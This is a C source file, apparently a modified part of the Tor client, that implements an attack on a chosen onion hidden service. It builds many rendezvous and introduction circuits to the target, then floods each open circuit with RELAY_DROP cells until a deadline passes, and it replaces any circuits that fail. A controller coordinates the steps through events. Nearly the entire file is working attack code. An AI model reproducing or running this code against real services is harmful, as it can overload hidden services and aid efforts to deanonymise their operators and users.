/**
 * \file hs_rd_attack.c
 * \brief contains code to connect to request hidden service and send
 *  relay drop cells to it 
 **/

#include "hs_rd_attack.h"
/* Global variable but not accessible from other files
 * Allow the program to keep a state of the attack 
 *
 * A little bit sexier than extern variables, still messy
 * but ... Ca casse pas trois pattes a un canard :-)
 */

/*NOTE
 *
 * Use control_event to talk with controller
 *
 * Need event-based control to carry out the steps of the attack
 */
static hs_rd_attack_t *attack_infos = NULL;


static int launch_new_rendezvous(){
  circ_info_t *circmap = (circ_info_t *) tor_malloc(sizeof(circ_info_t));
  circmap->extend_info = NULL;
  circmap->introcirc = NULL;
  circmap->state_intro = CIRC_NO_STATE;
  circmap->state_rend = REND_CIRC_BUILDING;
  log_info(LD_REND, "HS_ATTACK: launching rend circuit");
  circmap->rendcirc = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
      CIRCLAUNCH_IS_INTERNAL);
  if (circmap->rendcirc) {
    log_info(LD_REND, "HS_ATTACK : rendcircuit launched\n");
    circmap->launched_at = time(NULL);
    circmap->rendcirc->rend_data =
      rend_data_client_create(attack_infos->current_target, NULL, NULL, REND_NO_AUTH);
    smartlist_add(attack_infos->rendcircs, circmap);
    attack_infos->stats->nbr_rendcircs++;
    return 0;
  } else {
    log_debug(LD_REND, "rendcircuit not launched\n");
    tor_free(circmap->rendcirc);
    tor_free(circmap);
    return -1;
  }
}

static int 
hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
  log_info(LD_REND,"HS_ATTACK : entering hs_attack_init_rendezvous_circuits\n");
  int c = 0;
  while (attack_infos->rendcircs->num_used < nbr_circuits) {
    if (launch_new_rendezvous() < 0){
      c++;
      if (c >= RETRY_THRESHOLD*nbr_circuits)
        return -1;
    }
  }
  return 0;
}

/*
 * Create a circuit towards the introduction point and send
 * nbr_circuits different INTRO1 cells
 */

static int hs_attack_init_intro_circuit(int retry) {
  //uint8_t flags = CIRCLAUNCH_ONEHOP_TUNNEL;
  uint8_t flags = CIRCLAUNCH_NEED_UPTIME;

  if (retry == 0){
    log_info(LD_REND, "HS_ATTACK: Entering hs_attack_init_intro_circuit\n");
    /* kind of hack. We don't have ant_set_p_circid_chan(circ, p_circ_id, p_chan);_y circuit yet
     * to use as introducing circuit. Launch one intro circ
     * for each rendezvous circ  and wait
     * until we can canibilize it*/
    SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
      circmap->introcirc = circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, flags);
    } SMARTLIST_FOREACH_END(circmap);

    attack_infos->retry_intro++;
    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
    return 0; 
  }
  
    /*
     * Fetch them one for all
     */
  int count_missing = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (!circmap->extend_info)
      circmap->extend_info = rend_client_get_random_intro(
          circmap->rendcirc->rend_data);
    if (!circmap->extend_info) {
      log_info(LD_REND,
          "HS_ATTACK: No intro point for '%s': re-fetching service descriptor an try later.\n",
          attack_infos->current_target);
      if (circmap->rendcirc)
        rend_client_refetch_v2_renddesc(circmap->rendcirc->rend_data);
      count_missing++;
    }
    else {
      log_info(LD_REND, "HS_ATTACK: Yay! we have an intropoint : %s\n", extend_info_describe(
       circmap->extend_info));
    }
  } SMARTLIST_FOREACH_END(circmap);
  if (count_missing) {
    attack_infos->retry_intro++;
    attack_infos->state =  ATTACK_STATE_CONNECT_TO_INTRO;
    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
    return 0;
  }

  /*Completly mindfuck yeah but ... Look for a general circuit; change its role
   * and send intro request
   * without having build previously a GENERAL circ, we got null =>
   * Always build a general circ before then build the circ we need for introduction
   * because introcircs have been designed to be extension of general circs towards
   * an introduction point*/
 // return 0;
  int count_failure = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (!circmap->state_intro) {
      circmap->introcirc = circuit_launch_by_extend_info(
          CIRCUIT_PURPOSE_C_INTRODUCING, circmap->extend_info, flags);
      if (circmap->introcirc){
        circmap->state_intro = INTRO_CIRC_BUILDING;
        log_info(LD_REND, "HS_ATTACK: Intro circ building. Swibidi yay !\n");
      }
      else
        count_failure++;
    }
  } SMARTLIST_FOREACH_END(circmap);
  if (count_failure && retry < RETRY_THRESHOLD*count_failure) {
    log_info(LD_REND, "HS_ATTACK: Something went wrong when building\
                       introcirc -- retry with new extend_info next time\n");
    //could do this with subtype of event like INFO : RETRY_INTRO
    //but it would be less nice on client side
    /*we have circuit; change its purpose*/
    attack_infos->retry_intro++;
    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
    return 0;
  }
  else if (count_failure && retry >= RETRY_THRESHOLD*count_failure) {
    //tor_free(attack_infos->circ_to_intro->circ);
    //tor_free(attack_infos->circ_to_intro);
    return -1;
  }
  log_info(LD_REND, "HS_ATTACK: We have an intro circ ready building or ready !\n");
  return 0;
}

/*
 * Called by rend_client_rendezvous_acked to launch introcell 
 * or when the intro circ opened
 * if introcel circuit is ready
 */

//TODO code duplication to fix
void hs_attack_send_intro_cell_callback(origin_circuit_t *rend_or_intro_circ){
  //return;
  int retval=0;
  log_info(LD_REND, "HS_ATTACK: send_intro_cell_callback called !\n");
  
  int launch = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (rend_or_intro_circ == circmap->rendcirc) {
      if (circmap->state_intro == INTRO_CIRC_READY)
        launch = 1;
    }
    if (rend_or_intro_circ == circmap->introcirc) {
      if (circmap->state_rend == REND_CIRC_READY_FOR_INTRO)
        launch = 1;
    }
    if (launch){
      circmap->introcirc->rend_data = circmap->rendcirc->rend_data;
      retval = rend_client_send_introduction(circmap->introcirc,
          circmap->rendcirc);
      if(retval < 0) {
        log_debug(LD_BUG, "HS_ATTACK: INTRO not sent. retval: %d", retval);
        // should do something if it happens -- kill circuit and try again ?
        // exit the prog if it happens too much ?
        return;
      }
      circmap->state_rend = REND_CIRC_INTRO_CELL_SENT;
      circmap->state_intro = REND_CIRC_INTRO_CELL_SENT;
      return;
    }
  } SMARTLIST_FOREACH_END(circmap);

}

/*
 * Received a rendezous2 cell on circ; circ joined and is
 * now ready to send relaydrop cells
 * Send message to the controller if all circs are ready
 */
void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
  int count_ready = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (circmap->rendcirc == rendcirc) {
      log_info(LD_REND,"HS_ATTACK: Marking rendezvous circuit ready");
      circmap->state_rend = REND_CIRC_READY_FOR_RD;
    }
    if (circmap->state_rend == REND_CIRC_READY_FOR_RD)
      count_ready++;
  } SMARTLIST_FOREACH_END(circmap);
  if (count_ready == attack_infos->rendcircs->num_used &&
      attack_infos->state != ATTACK_STATE_LAUNCHED) {
    //tell controller that we are ready to launch the attack
    log_info(LD_REND, "HS_ATTACK: Seems that we are ready to launch the attack. Waiting instructions\n");
    control_event_hs_attack(HS_ATTACK_RD_READY);
  }
}

void hs_attack_mark_rendezvous_ready_for_intro(origin_circuit_t *rendcirc) {
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (circmap->rendcirc == rendcirc) {
      log_info(LD_REND, "HS_ATTACK: marking rendezvous circ ready for sending intro\n");
      circmap->state_rend = REND_CIRC_READY_FOR_INTRO;
      return;
    }
  } SMARTLIST_FOREACH_END(circmap);
  log_debug(LD_REND, "HS_ATTACK: rendcirc not in the list !\n");
}

void hs_attack_mark_intro_ready(origin_circuit_t *introcirc) {
  log_info(LD_REND, "HS_ATTACK: Marking Introcirc ready\n");
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
    if (circmap->introcirc == introcirc) {
      circmap->state_intro = INTRO_CIRC_READY;
      return;
    }
  }SMARTLIST_FOREACH_END(circmap);
}


/*
 *
 * Create a valid relay drop cell for session with circuit circ and sent it through circ
 *
 * If the cell cannot be sent, we mark the circuit for close and return -1
 */

static int send_rd_cell(origin_circuit_t *circ){
  if (relay_send_command_from_edge(0, TO_CIRCUIT(circ),
                                   RELAY_COMMAND_DROP,
                                   NULL, 0, circ->cpath->prev) < 0)
    return -1;
  return 0;
}

static void hs_attack_launch(time_t *until) {
  attack_infos->state = ATTACK_STATE_LAUNCHED;
  if (HS_ATTACK_TESTING) {
    /*Just send 1 rd through each rendezvous circ*/
    time_t now = time(NULL);
    int i = 0;
    while (*until > now && i < 1) {
      SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
        log_info(LD_REND, "HS_ATTACK: Trying to send rd cell down circ %s\n",
            circuit_list_path(circmap->rendcirc, 0));
        if (send_rd_cell(circmap->rendcirc) < 0) {
          log_debug(LD_REND, "HS_ATTACK: send_rd_cell failed\n");
        }
      }SMARTLIST_FOREACH_END(circmap);
      //sleep(1);
      i++;
      now = time(NULL);
    }
  }
  else {
    // Send bunch of relay drop cells through all circuits until time_t *until said
    // to stop
    time_t now = time(NULL);
    int num_cell_per_circuit = 100; //arbitrarya
    int i;
    circ_info_t *circmap;
    int circmaps_sl_idx, circmaps_sl_len;
    while(*until > now) {
      circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
      for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; ++circmaps_sl_idx) {
        circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
        if (circmap->rendcirc->base_.state == CIRCUIT_STATE_OPEN && 
              circmap->state_rend == REND_CIRC_READY_FOR_RD) {
          for (i=0; i < num_cell_per_circuit; i++) {
            if (send_rd_cell(circmap->rendcirc) < 0) {
              //remove the circ; launch a new one.
              circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);
              circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);
              extend_info_free(circmap->extend_info);
              smartlist_del(attack_infos->rendcircs, circmaps_sl_idx);
              launch_new_rendezvous();
              break;
            }
          }
        }
      }
      now = time(NULL);
    }
  }
}

static void check_expiration(circ_info_t *circmap, int idx) {
  time_t now = time(NULL);
  if (now - circmap->launched_at > HS_ATTACK_CIRC_TIMEOUT) {
    circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);
    circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);
    extend_info_free(circmap->extend_info);
    smartlist_del(attack_infos->rendcircs, idx);
    launch_new_rendezvous();
  }
}

static void hs_attack_check_healthiness() {
  switch(attack_infos->state) {
    case INITIALIZED : return;break;
    case ATTACK_STATE_CONNECT_TO_INTRO:
     {
       circ_info_t *circmap;
       int circmaps_sl_idx, circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
       for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; ++circmaps_sl_idx) {
         circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
         if (circmap->state_rend != REND_CIRC_READY_FOR_RD && 
             circmap->state_intro != INTRO_CIRC_READY) {
           check_expiration(circmap, circmaps_sl_idx);
         }
       }
     }
     break;
    case ATTACK_STATE_LAUNCHED:
      {
        circ_info_t *circmap;
        int circmaps_sl_idx, circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
        for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; ++circmaps_sl_idx) {
          circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
          if ((circmap->rendcirc->base_.state != CIRCUIT_STATE_OPEN &&
              circmap->state_rend == REND_CIRC_READY_FOR_RD) || TO_CIRCUIT(circmap->rendcirc)->marked_for_close) {
            circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);
            circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);
            extend_info_free(circmap->extend_info);
            smartlist_del(attack_infos->rendcircs, circmaps_sl_idx);
            launch_new_rendezvous();
          }
          else if (circmap->state_intro != INTRO_CIRC_READY &&
              circmap->state_rend != REND_CIRC_READY_FOR_RD) {
            check_expiration(circmap, circmaps_sl_idx);
          }
        }
      } 
      break;
  }
  circuit_close_all_marked();
}


static void free_hs_rd_attack(){
  circuit_free_all();
}


hs_attack_stats_t*
hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress, 
    int nbr_circuits, time_t *until) {
  log_info(LD_REND, "HS_ATTACK : Entering hs_attack_entry_point\n");
  if (!attack_infos){
    log_info(LD_REND,"HS_ATTACK : initalize attack_infos\n");
    attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
    attack_infos->rendcircs = smartlist_new();
    attack_infos->stats = (hs_attack_stats_t *)  tor_malloc(sizeof(hs_attack_stats_t));
    attack_infos->retry_intro = 0;
    attack_infos->nbr_circuits = nbr_circuits;
    attack_infos->stats->tot_cells = 0;
    attack_infos->stats->nbr_rendcircs = 0;
    /* 
     * attack_already_launched is used in the callback of rendezvous circuit when 
     * RENDCELL2 is received.  In the init phase, we need to tell the controller
     * when all rdvcircs are ready to launch the attack. But during the attack, it is
     * possible to launch new rendezvous circs. In this case, we don't want to notice
     * the controller.
     * */
    /*attack_infos->extend_info = NULL;*/
    attack_infos->current_target = strdup(onionaddress);
    //attack_infos->rend_data = NULL;
    //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
    attack_infos->state = INITIALIZED;
  }
  switch(cmd) {
    case ESTABLISH_RDV:
      // Establish all rendezvous circuits
      if (hs_attack_init_rendezvous_circuits(nbr_circuits, onionaddress) < 0) {
        log_debug(LD_REND, "HS_ATTACK : not managed to create rendezvous circuits\n");
        return NULL;
      }
      if (hs_attack_init_intro_circuit(attack_infos->retry_intro) < 0) {
          log_debug(LD_REND, "HS_ATTACK : not managed to create intro circuit\n");
          return NULL; 
      }
      break;
    case SEND_RD: 
      hs_attack_launch(until); break;
    case CHECK_HEALTHINESS:
      hs_attack_check_healthiness(); break;
    default: break;
  }
  return attack_infos->stats;
}
